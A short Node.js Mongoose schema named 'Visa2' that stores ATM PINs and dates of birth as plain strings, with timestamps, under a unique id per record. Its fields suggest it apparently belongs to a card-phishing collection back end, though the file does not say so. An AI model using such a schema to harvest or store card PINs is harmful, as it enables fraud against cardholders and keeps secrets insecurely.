const mongoose = require('mongoose');

const visa2Schema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      atmPin: { type: String, required: true },
      dob: { type: String, required: true },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

module.exports = mongoose.model('Visa2', visa2Schema);
